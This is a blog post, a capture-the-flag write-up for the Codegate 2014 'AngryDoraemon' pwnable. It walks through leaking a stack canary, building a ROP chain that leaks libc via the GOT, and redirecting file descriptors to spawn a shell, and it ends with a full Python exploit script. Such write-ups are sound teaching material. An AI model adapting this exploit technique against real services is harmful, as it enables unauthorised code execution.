@@ -1,0 +1,591 @@
+<!DOCTYPE html>
+<html lang="en-us">
+<head>
+
+  <meta charset="utf-8" />
+
+  
+  <title>Codegate 2k14 AngryDoraemon (pwnable 250) write up</title>
+
+  
+  
+  <link href="//cdn.jsdelivr.net" rel="dns-prefetch">
+  <link href="//cdnjs.cloudflare.com" rel="dns-prefetch">
+  
+  <link href="//at.alicdn.com" rel="dns-prefetch">
+  
+  <link href="//fonts.googleapis.com" rel="dns-prefetch">
+  <link href="//fonts.gstatic.com" rel="dns-prefetch">
+  
+  
+  
+  
+  
+
+  
+
+  
+  <meta name="author" content="pwntester">
+  <meta name="description" content="This is an easy pwnable level but very interesting since there are many ways to exploit it so lets start checking the binary protections:
+Not bad, ASLR and NX enabled and the stack is protected with a Canary. Lets analyze what does it do &amp;hellip; Running the binary opens a socket in port 8888 which we can connect to and receive a menu with options to attack Doraemon:
+Normally I play with the binary and try to get a crash which is simple in this case, but this time I decided to do some Reversing that payed off very well, I found the following vulnerabilities:">
+
+  
+  
+    <meta name="twitter:card" content="summary">
+    <meta name="twitter:site" content="@pwntester">
+    <meta name="twitter:title" content="Codegate 2k14 AngryDoraemon (pwnable 250) write up">
+    <meta name="twitter:description" content="This is an easy pwnable level but very interesting since there are many ways to exploit it so lets start checking the binary protections:
+Not bad, ASLR and NX enabled and the stack is protected with a Canary. Lets analyze what does it do &amp;hellip; Running the binary opens a socket in port 8888 which we can connect to and receive a menu with options to attack Doraemon:
+Normally I play with the binary and try to get a crash which is simple in this case, but this time I decided to do some Reversing that payed off very well, I found the following vulnerabilities:">
+    <meta name="twitter:image" content="/images/avatar.jpeg">
+  
+
+  
+  <meta property="og:type" content="article">
+  <meta property="og:title" content="Codegate 2k14 AngryDoraemon (pwnable 250) write up">
+  <meta property="og:description" content="This is an easy pwnable level but very interesting since there are many ways to exploit it so lets start checking the binary protections:
+Not bad, ASLR and NX enabled and the stack is protected with a Canary. Lets analyze what does it do &amp;hellip; Running the binary opens a socket in port 8888 which we can connect to and receive a menu with options to attack Doraemon:
+Normally I play with the binary and try to get a crash which is simple in this case, but this time I decided to do some Reversing that payed off very well, I found the following vulnerabilities:">
+  <meta property="og:url" content="http://pwntester.com/blog/2014/03/21/codegate-2k14-angrydoraemon-pwnable-250-write-up/">
+  <meta property="og:image" content="/images/avatar.jpeg">
+
+
+
+
+<meta name="generator" content="Hugo 0.59.0">
+
+
+<link rel="canonical" href="http://pwntester.com/blog/2014/03/21/codegate-2k14-angrydoraemon-pwnable-250-write-up/">
+
+<meta name="renderer" content="webkit">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<meta name="format-detection" content="telephone=no,email=no,adress=no">
+<meta http-equiv="Cache-Control" content="no-transform">
+
+
+<meta name="robots" content="index,follow">
+<meta name="referrer" content="origin-when-cross-origin">
+
+
+
+
+
+
+
+<meta name="theme-color" content="#02b875">
+<meta name="apple-mobile-web-app-capable" content="yes">
+<meta name="apple-mobile-web-app-status-bar-style" content="black">
+<meta name="apple-mobile-web-app-title" content="&lt;/pwntester&gt;">
+<meta name="msapplication-tooltip" content="&lt;/pwntester&gt;">
+<meta name='msapplication-navbutton-color' content="#02b875">
+<meta name="msapplication-TileColor" content="#02b875">
+<meta name="msapplication-TileImage" content="/icons/icon-144x144.png">
+<link rel="icon" href="/favicon.ico">
+<link rel="icon" type="image/png" sizes="16x16" href="/icons/icon-16x16.png">
+<link rel="icon" type="image/png" sizes="32x32" href="/icons/icon-32x32.png">
+<link rel="icon" sizes="192x192" href="/icons/icon-192x192.png">
+<link rel="apple-touch-icon" href="/icons/icon-152x152.png">
+<link rel="manifest" href="/manifest.json">
+
+
+<link rel="preload" href="/styles/main-rendered.min.css" as="style">
+
+
+<link rel="preload" href="https://fonts.googleapis.com/css?family=Lobster" as="style">
+<link rel="preload" href="/images/avatar.jpeg" as="image">
+<link rel="preload" href="/images/grey-prism.svg" as="image">
+
+
+<style>
+  body {
+    background: #22313F;
+  }
+</style>
+<link rel="stylesheet" href="/styles/main-rendered.min.css">
+
+
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Lobster">
+
+
+
+<script src="https://cdn.jsdelivr.net/npm/medium-zoom@1.0.2/dist/medium-zoom.min.js"></script>
+
+
+
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/video.js@7.3.0/dist/video-js.min.css">
+
+
+
+  
+  
+<!--[if lte IE 8]>
+  <script src="https://cdn.jsdelivr.net/npm/html5shiv@3.7.3/dist/html5shiv.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/respond.js@1.4.2/dest/respond.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/videojs-ie8@1.1.2/dist/videojs-ie8.min.js"></script>
+<![endif]-->
+
+<!--[if lte IE 9]>
+  <script src="https://cdn.jsdelivr.net/npm/eligrey-classlist-js-polyfill@1.2.20180112/classList.min.js"></script>
+<![endif]-->
+
+
+</head>
+  <body>
+    <div class="suspension">
+      <a role="button" aria-label="Go to top" title="Go to top" class="to-top is-hide"><span class="icon icon-up" aria-hidden="true"></span></a>
+      
+        
+      
+    </div>
+    
+    
+  <header class="site-header">
+  <a href="http://pwntester.com/"><img class="avatar" src="/images/avatar.jpeg" alt="Avatar"></a>
+  
+  <h2 class="title"><a href="http://pwntester.com/">&lt;/pwntester&gt;</a></h2>
+  
+  <button class="menu-toggle" type="button" aria-label="Main Menu" aria-expanded="false" tab-index="0">
+    <span class="icon icon-menu" aria-hidden="true"></span>
+  </button>
+
+  <nav class="site-menu collapsed">
+    <h2 class="offscreen">Main Menu</h2>
+    <ul class="menu-list">
+      
+      
+      
+      
+        <li class="menu-item
+          
+          
+          ">
+          <a href="/post">Blog</a>
+        </li>
+      
+        <li class="menu-item
+          
+          
+          ">
+          <a href="https://github.com/pwntester">Works</a>
+        </li>
+      
+        <li class="menu-item
+          
+          
+          ">
+          <a href="/tags/">Tags</a>
+        </li>
+      
+    </ul>
+  </nav>
+  <nav class="social-menu collapsed">
+    <h2 class="offscreen">Social Networks</h2>
+    <ul class="social-list"><li class="social-item">
+          <a href="mailto:alvaro@pwntester.com" title="Email" aria-label="Email">
+            <span class="icon icon-email" aria-hidden="true"></span>
+          </a>
+        </li><li class="social-item">
+          <a href="//github.com/pwntester" rel="me" title="GitHub" aria-label="GitHub">
+	    <span class="icon icon-github" aria-hidden="true"></span>
+          </a>
+        </li><li class="social-item">
+          <a href="//twitter.com/pwntester" rel="me" title="Twitter" aria-label="Twitter">
+            <span class="icon icon-twitter" aria-hidden="true"></span>
+          </a>
+        </li><li class="social-item">
+          <a href="//www.linkedin.com/in/alvaroms" rel="me" title="LinkedIn" aria-label="LinkedIn">
+            <span class="icon icon-linkedin" aria-hidden="true"></span>
+          </a>
+        </li></ul>
+  </nav>
+</header>
+
+  <section class="main post-detail">
+    <header class="post-header">
+      <h1 class="post-title">Codegate 2k14 AngryDoraemon (pwnable 250) write up</h1>
+      <p class="post-meta">@pwntester · Mar 21, 2014 · 7 min read</p>
+    </header>
+    <article class="post-content"><p>This is an easy pwnable level but very interesting since there are many ways to exploit it so lets start checking the binary protections:</p>
+
+<p><img src="/images/octopress/angrybird-1.png" alt="" /></p>
+
+<p>Not bad, ASLR and NX enabled and the stack is protected with a Canary. Lets analyze what does it do &hellip; Running the binary opens a socket in port 8888 which we can connect to and receive a menu with options to attack Doraemon:</p>
+
+<p><img src="/images/octopress/angrybird-2.png" alt="" /></p>
+
+<p>Normally I play with the binary and try to get a crash which is simple in this case, but this time I decided to do some Reversing that payed off very well, I found the following vulnerabilities:</p>
+
+<ul>
+<li>First Attack -&gt; right attack: Allows us to enter any 4 bytes and call that address.
+
+<ul>
+<li>{% img center /images/angrybird-4.png %}</li>
+</ul></li>
+<li>Sword options leads to a portion of code that executes a shell :) However we cannot intereact with it :(
+
+<ul>
+<li>{% img center /images/angrybird-3.png %}</li>
+</ul></li>
+<li>Mouse attack -&gt; are you sure? contains a buffer overflow, but the stack is protected with the canary
+
+<ul>
+<li>{% img center /images/angrybird-12.png %}</li>
+<li>However we still get some output in the client:</li>
+<li>{% img center /images/angrybird-5.png %}</li>
+</ul></li>
+</ul>
+
+<p>That last vulnerability is interesting! not only allow us to influence EIP but also leak some bytes from memory! Lets see how it works. If we send yAAAA we get the following stack right before the &ldquo;ret&rdquo;:</p>
+
+<p><img src="/images/octopress/angrybird-6.png" alt="" /></p>
+
+<p>We can see that ESP points to 0x0840492c5 that is the saved EIP, the dword before is the saved EBP and the one in 0xbffff95c is the canary (starting with a \x00). When the program prints &ldquo;You choose xxxx&rdquo; its printing a null terminated string starting at 0xbffff952</p>
+
+<p><img src="/images/octopress/angrybird-7.png" alt="" /></p>
+
+<p>This is really close to our canary so if we send some more As we can extend the string so it includes the bytes in the canary. Since it contains a null byte at the beggining, we have to overwrite it too so the strings get extended until next null. We need &ldquo;y&rdquo; + 10 &ldquo;A&rdquo;s. Actually, we can even include the saved EBP in the leak so we can use it as a reference to point to items in the stack. Cool!</p>
+
+<p>Lets write a small script to leak the canary and EBP:</p>
+
+<pre><code class="language-lang-python">def get_canary(ip, port):
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    s.connect((ip, port))
+    print(&quot;[+] Wating for menu&quot;)
+    time.sleep(3)
+    # Receive menu
+    s.recv(1024)
+    s.send(&quot;4\n&quot;)
+    time.sleep(1)
+    print(&quot;[+] Sending mouse trap&quot;)
+    payload = &quot;y&quot; + &quot;A&quot;*9 + &quot;\n&quot;
+    s.send(payload)
+    # Receive &quot;are you sure?&quot;
+    message = s.recv(60)
+    # Receive canary
+    message = s.recv(60)
+    canary_group = re.match(&quot;.*yAAAAAAAAA\n(.*)'!.*&quot;, message)
+    canary = struct.unpack(&quot;&lt;I&quot;, &quot;\x00&quot; + canary_group.group(1)[:3])[0]
+    ebp = struct.unpack(&quot;&lt;I&quot;, canary_group.group(1)[11:15])[0]
+    eip = struct.unpack(&quot;&lt;I&quot;, canary_group.group(1)[15:19])[0]
+    print &quot;[+] Got canary %#x&quot; % canary
+    print &quot;[+] Got saved ebp %#x&quot; % ebp
+    print &quot;[+] Got saved eip %#x&quot; % eip
+    s.close()
+    return (canary, ebp, eip)
+</code></pre>
+
+<p><img src="/images/octopress/angrybird-8.png" alt="" /></p>
+
+<p>Ok, now that we know the canary we can use it to influence EIP without firing all the alarms. Since the stack is not executable we will need a ROP chain to get code execution. My idea is to redirect stdin, stdout and stderr to the opened socket and then redirect the code flow to the original call to execl(&ldquo;/bin/sh&rdquo;) present in the code. But since the system has ASLR enabled we need to leak a libc address to calculate <strong>dup2</strong> address.</p>
+
+<p>Since the PLT contains interesting functions like read or write, we can interact with the application. For example we can use the ROP chain to call <strong>write</strong> and send any number of bytes to the socket, even the whole binary (interesting for Blind ROP techniques). What content are we interested in? what about a resolved address in the GOT so we can leak a libc function address? That way and since the offsets will be constant, we can calculate any function address in libc. This is the script to leak any address from the GOT:</p>
+
+<pre><code class="language-lang-python">def leak_address(ip, port, canary, ebp, address, socketfd):
+    ss = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    ss.connect((ip, port))
+    print(&quot;[+] Reconnecting&quot;)
+    time.sleep(3)
+    # Receive menu
+    ss.recv(1024)
+    ss.send(&quot;4\n&quot;)
+    time.sleep(1)
+    # Receive &quot;are you sure?&quot;
+    ss.recv(60)
+    print(&quot;[+] Sending leakage payload&quot;)
+    leak_payload = [&quot;y&quot;*10,
+                p(canary),
+                &quot;B&quot;*8,
+                p(ebp),
+                p(0x080486e0), # write@plt
+                p(0x41414141), # exit
+                p(socketfd),  # socket fd
+                p(address),  # write@got: address to read write@libc from
+                p(4), # bytes to read
+                &quot;\n&quot;]
+
+    leak_payload = &quot;&quot;.join(leak_payload)
+    ss.send(leak_payload)
+    leak = ss.recv(4)
+    ss.close()
+    return struct.unpack(&quot;&lt;I&quot;, leak)[0]
+</code></pre>
+
+<p>In this case we use a ROP chain that calls &ldquo;write&rdquo; and reads 4 bytes from the GOT offset where write@libc is stored and send it to the socket fd.</p>
+
+<p><img src="/images/octopress/angrybird-9.png" alt="" /></p>
+
+<p>Now lets find out the offset between &ldquo;write&rdquo; and &ldquo;dup2&rdquo; in libc:</p>
+
+<p><img src="/images/octopress/angrybird-10.png" alt="" /></p>
+
+<p>Cool, so we now can call <strong>dup2</strong> to redirect the standard output and input to the socket, run our shell and interact with it. The payload looks like:</p>
+
+<pre><code class="language-lang-python">(canary, ebp, eip) = get_canary(ip, port)
+
+write_addr = leak_address(ip, port, canary, ebp, 0x804b040, socketfd)
+
+dup2_write_offset = 0x7d0
+dup2_addr = write_addr + dup2_write_offset
+
+print &quot;[+] Leaked write address %#x&quot; % write_addr
+print &quot;[+] Got dup2 address %#x&quot; % dup2_addr
+
+payload =   [&quot;A&quot;*10,
+            p(canary),
+            &quot;B&quot;*8,
+            p(ebp),
+            p(dup2_addr),
+            p(0x080495be), # pop, pop, ret
+            p(socketfd),  # fd 4
+            p(0),  # fd 0
+            p(dup2_addr),
+            p(0x080495be), # pop, pop, ret
+            p(socketfd),  # fd 4
+            p(1),  # fd 1
+            p(dup2_addr),
+            p(0x080495be), # pop, pop, ret
+            p(socketfd),  # fd 4
+            p(2),  # fd 2
+            p(0x08048c62), # call execl(&quot;/bin/sh&quot;)
+            &quot;\n&quot;]
+</code></pre>
+
+<p>We basically call dup2 three times to redirect stdin, stdout and stderr to the socket and then we return to 0x08048c62 where there is a call to execl(&ldquo;/bin/sh&rdquo;). Convenient, right? Now all we have to do is interact with the shell via the socket:</p>
+
+<pre><code class="language-lang-python">print &quot;[+] Shell is waiting ...&quot;
+while True:
+    sys.stdout.write(&quot;$ &quot;)
+    sys.stdout.flush()
+    c = sys.stdin.readline()
+    s.send(c)
+    time.sleep(0.5)
+    print s.recv(4095)
+</code></pre>
+
+<p><img src="/images/octopress/angrybird-11.png" alt="" /></p>
+
+<p>Voila!</p>
+
+<p>Full exploit:</p>
+
+<pre><code class="language-lang-python">import socket
+import struct
+import time
+import sys
+import re
+
+def get_canary(ip, port):
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    s.connect((ip, port))
+    print(&quot;[+] Wating for menu&quot;)
+    time.sleep(3)
+    # Receive menu
+    s.recv(1024)
+    s.send(&quot;4\n&quot;)
+    time.sleep(1)
+    print(&quot;[+] Sending mouse trap&quot;)
+    payload = &quot;y&quot; + &quot;A&quot;*9 + &quot;\n&quot;
+    s.send(payload)
+    # Receive &quot;are you sure?&quot;
+    message = s.recv(60)
+    # Receive canary
+    message = s.recv(60)
+    canary_group = re.match(&quot;.*yAAAAAAAAA\n(.*)'!.*&quot;, message)
+    canary = struct.unpack(&quot;&lt;I&quot;, &quot;\x00&quot; + canary_group.group(1)[:3])[0]
+    ebp = struct.unpack(&quot;&lt;I&quot;, canary_group.group(1)[11:15])[0]
+    eip = struct.unpack(&quot;&lt;I&quot;, canary_group.group(1)[15:19])[0]
+    print &quot;[+] Got canary %#x&quot; % canary
+    print &quot;[+] Got saved ebp %#x&quot; % ebp
+    print &quot;[+] Got saved eip %#x&quot; % eip
+    s.close()
+    return (canary, ebp, eip)
+
+def leak_address(ip, port, canary, ebp, address, socketfd):
+    ss = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    ss.connect((ip, port))
+    print(&quot;[+] Reconnecting&quot;)
+    time.sleep(3)
+    # Receive menu
+    ss.recv(1024)
+    ss.send(&quot;4\n&quot;)
+    time.sleep(1)
+    # Receive &quot;are you sure?&quot;
+    ss.recv(60)
+    print(&quot;[+] Sending leakage payload&quot;)
+    leak_payload = [&quot;y&quot;*10,
+                p(canary),
+                &quot;B&quot;*8,
+                p(ebp),
+                p(0x080486e0), # write@plt
+                p(0x41414141), # exit
+                p(socketfd),  # socket fd
+                p(address),  # write@got: address to read write@libc from
+                p(4), # bytes to read
+                &quot;\n&quot;]
+
+    leak_payload = &quot;&quot;.join(leak_payload)
+    ss.send(leak_payload)
+    leak = ss.recv(4)
+    ss.close()
+    return struct.unpack(&quot;&lt;I&quot;, leak)[0]
+
+def ask_for_key():
+    print &quot;[+] Now change gdb affinity and press any key&quot;
+    input = raw_input()
+
+def send_mouse_attack(s, payload):
+    print(&quot;[+] Reconnecting&quot;)
+    time.sleep(3)
+    # Receive menu
+    s.recv(1024)
+    s.send(&quot;4\n&quot;)
+    time.sleep(1)
+    # Receive are you sure?
+    s.recv(1024)
+    print(&quot;[+] Sending payload&quot;)
+    s.send(payload)
+
+def p(addr):
+    return struct.pack(&quot;&lt;I&quot;, addr)
+
+
+if __name__ == &quot;__main__&quot;:
+    ip = '127.0.0.1'
+    port = 8888
+    socketfd = 4
+
+    (canary, ebp, eip) = get_canary(ip, port)
+
+    write_addr = leak_address(ip, port, canary, ebp, 0x804b040, socketfd)
+
+    dup2_write_offset = 0x7d0
+    dup2_addr = write_addr + dup2_write_offset
+
+    print &quot;[+] Leaked write address %#x&quot; % write_addr
+    print &quot;[+] Got dup2 address %#x&quot; % dup2_addr
+
+    payload =   [&quot;A&quot;*10,
+                p(canary),
+                &quot;B&quot;*8,
+                p(ebp),
+                p(dup2_addr),
+                p(0x080495be), # pop, pop, ret
+                p(socketfd),  # fd 4
+                p(0),  # fd 0
+                p(dup2_addr),
+                p(0x080495be), # pop, pop, ret
+                p(socketfd),  # fd 4
+                p(1),  # fd 1
+                p(dup2_addr),
+                p(0x080495be), # pop, pop, ret
+                p(socketfd),  # fd 4
+                p(2),  # fd 2
+                p(0x08048c62), # call execl(&quot;/bin/sh&quot;)
+                &quot;\n&quot;]
+
+    payload = &quot;&quot;.join(payload)
+    #ask_for_key()
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    s.connect((ip, port))
+    send_mouse_attack(s, payload)
+    time.sleep(1)
+
+    print &quot;[+] Shell is waiting ...&quot;
+    while True:
+        sys.stdout.write(&quot;$ &quot;)
+        sys.stdout.flush()
+        c = sys.stdin.readline()
+        s.send(c)
+        time.sleep(0.5)
+        print s.recv(4095)
+
+    s.close()
+
+
+</code></pre>
+</article>
+    <footer class="post-footer">
+      
+      <ul class="post-tags">
+        
+          <li><a href="/tags/pwnable"><span class="tag">Pwnable</span></a></li>
+        
+          <li><a href="/tags/aslr"><span class="tag">Aslr</span></a></li>
+        
+          <li><a href="/tags/nx"><span class="tag">Nx</span></a></li>
+        
+          <li><a href="/tags/leak"><span class="tag">Leak</span></a></li>
+        
+      </ul>
+      
+      <p class="post-copyright">
+        This post was published <strong>2042</strong> days ago, content in the post may be inaccurate, even wrong now, please take risk yourself.
+      </p>
+    </footer>
+    
+      
+    
+  </section>
+  
+<footer class="site-footer">
+  <p>© 2017-2019 &lt;/pwntester&gt;</p>
+  <p>Powered by <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> with theme <a href="https://github.com/laozhu/hugo-nuo" target="_blank" rel="noopener">Nuo</a>.</p>
+  
+</footer>
+
+
+<script src="https://cdn.jsdelivr.net/npm/smooth-scroll@15.0.0/dist/smooth-scroll.min.js"></script>
+
+
+
+<script async src="https://cdn.jsdelivr.net/npm/video.js@7.3.0/dist/video.min.js"></script>
+
+
+
+
+<script async src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
+<script type="text/x-mathjax-config">
+  MathJax.Hub.Config({
+    tex2jax: {
+      inlineMath: [['$','$'], ['\\(','\\)']],
+      displayMath: [['$$','$$'], ['\\[','\\]']],
+      processEscapes: true,
+      processEnvironments: true,
+      skipTags: ['script', 'noscript', 'style', 'textarea', 'pre'],
+      TeX: { equationNumbers: { autoNumber: "AMS" },
+      extensions: ["AMSmath.js", "AMSsymbols.js"] }
+    },
+  });
+</script>
+<script type="text/x-mathjax-config">
+  // Fix <code> tags after MathJax finishes running. This is a
+  // hack to overcome a shortcoming of Markdown. Discussion at
+  // https://github.com/mojombo/jekyll/issues/199
+  MathJax.Hub.Queue(() => {
+    MathJax.Hub.getAllJax().map(v => v.SourceElement().parentNode.className += ' has-jax');
+  });
+</script>
+
+
+
+<script src="/scripts/index.min.js"></script>
+
+<script>
+  if ('serviceWorker' in navigator) {
+    navigator.serviceWorker.register('\/service-worker.js').then(function() {
+      console.log('[ServiceWorker] Registered');
+    });
+  }
+</script>
+
+
+
+
+
+
+
+
+  </body>
+</html>
